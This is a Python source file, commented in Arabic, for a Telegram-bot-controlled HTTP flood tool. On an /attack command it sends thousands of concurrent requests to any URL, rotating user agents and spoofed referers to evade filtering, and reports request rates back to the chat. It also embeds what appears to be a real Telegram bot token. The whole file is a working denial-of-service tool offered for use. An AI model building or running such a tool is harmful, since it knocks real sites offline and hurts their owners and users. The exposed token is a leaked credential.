import asyncio
import aiohttp
import requests
import random
import time
import socket
from fake_useragent import UserAgent
import telebot
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# إعدادات متوافقة مع 8vCPU و8GB RAM
MAX_THREADS = 2000  # تم تخفيضها لتحسين الاستقرار
REQUEST_TIMEOUT = 15
CONNECTION_LIMIT = 500  # تجنب استنزاف الذاكرة
KEEPALIVE_TIMEOUT = 20
REPORT_INTERVAL = 10000

# متغيرات التحكم
stop_attack = False
total_requests = 0
start_time = time.time()

class HybridAttack:
    def __init__(self, target, bot, chat_id):
        self.target = target
        self.bot = bot
        self.chat_id = chat_id
        self.domain = urlparse(target).netloc
        self.ip = socket.gethostbyname(self.domain)
        self.session = None
        self.ua = UserAgent()
        
        # موازنة الحمل بين الطريقتين (60% async - 40% sync)
        self.async_weight = 0.6
        self.sync_weight = 0.4

    async def create_async_session(self):
        """إنشاء جلسة غير متزامنة محسنة"""
        connector = aiohttp.TCPConnector(
            limit=CONNECTION_LIMIT,
            force_close=False,
            enable_cleanup_closed=True,
            keepalive_timeout=KEEPALIVE_TIMEOUT
        )
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
            trust_env=True
        )

    def generate_headers(self):
        """إنشاء رؤوس HTTP عشوائية متقدمة"""
        return {
            'User-Agent': self.ua.random,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Referer': random.choice([
                'https://www.google.com/',
                'https://www.facebook.com/',
                'https://www.youtube.com/'
            ]),
            'Cache-Control': 'no-cache'
        }

    async def async_attack(self):
        """هجوم غير متزامن (aiohttp)"""
        global total_requests, stop_attack
        while not stop_attack:
            try:
                async with self.session.get(
                    self.target,
                    headers=self.generate_headers()
                ) as response:
                    await response.read()
                    total_requests += 1
                    if total_requests % REPORT_INTERVAL == 0:
                        await self.send_report()
            except:
                continue

    def sync_attack(self):
        """هجوم متزامن (requests)"""
        global total_requests, stop_attack
        while not stop_attack:
            try:
                requests.get(
                    self.target,
                    headers=self.generate_headers(),
                    timeout=REQUEST_TIMEOUT
                )
                total_requests += 1
                if total_requests % REPORT_INTERVAL == 0:
                    asyncio.run_coroutine_threadsafe(self.send_report(), asyncio.get_event_loop())
            except:
                continue

    async def send_report(self):
        """إرسال تقرير الأداء"""
        duration = int(time.time() - start_time)
        req_rate = int(total_requests / max(1, duration))
        report = (
            f"📊 تقرير الهجوم:\n"
            f"• إجمالي الطلبات: {total_requests}\n"
            f"• معدل الطلبات/ثانية: {req_rate}\n"
            f"• المدة: {duration} ثانية\n"
            f"• الحالة: {'نشط' if not stop_attack else 'متوقف'}"
        )
        await self.bot.send_message(self.chat_id, report)

    async def start_hybrid_attack(self):
        """بدء الهجوم الهجين"""
        await self.create_async_session()
        
        # حساب عدد الخيوط لكل طريقة
        async_threads = int(MAX_THREADS * self.async_weight)
        sync_threads = MAX_THREADS - async_threads
        
        # بدء الهجوم غير المتزامن
        async_tasks = [self.async_attack() for _ in range(async_threads)]
        
        # بدء الهجوم المتزامن في خيوط منفصلة
        with ThreadPoolExecutor(max_workers=sync_threads) as executor:
            sync_tasks = [executor.submit(self.sync_attack) for _ in range(sync_threads)]
            await asyncio.gather(*async_tasks)
            
            # إيقاف المهام المتزامنة عند الطلب
            for task in sync_tasks:
                task.cancel()

    async def cleanup(self):
        """تنظيف الموارد"""
        if self.session:
            await self.session.close()
        await self.send_report()

# إعداد بوت التليجرام
bot = telebot.TeleBot("7248287448:AAFQcPnXrEaNaIFM-Lx_3VizIiv_9glWXCA")

@bot.message_handler(commands=['start'])
def handle_start(message):
    bot.reply_to(message, "🛠 نظام الهجوم الهجين المتقدم\n"
                         "/attack [رابط] - بدء الهجوم\n"
                         "/stop - إيقاف الهجوم")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global stop_attack, total_requests, start_time
    try:
        target = message.text.split()[1]
        if not target.startswith(('http://', 'https://')):
            bot.reply_to(message, "⚠ يجب أن يبدأ الرابط بـ http:// أو https://")
            return
        
        stop_attack = False
        total_requests = 0
        start_time = time.time()
        
        bot.reply_to(message, f"🚀 بدء الهجوم الهجين على {target}")
        attack = HybridAttack(target, bot, message.chat.id)
        
        # تشغيل الهجوم في خيط منفصل
        ThreadPoolExecutor(max_workers=1).submit(
            lambda: asyncio.run(attack.start_hybrid_attack())
        )
        
    except IndexError:
        bot.reply_to(message, "⚙ الاستخدام: /attack [رابط]")
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {str(e)}")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global stop_attack
    stop_attack = True
    bot.reply_to(message, "🛑 تم إيقاف الهجوم بنجاح")

if __name__ == "__main__":
    bot.polling(none_stop=True)
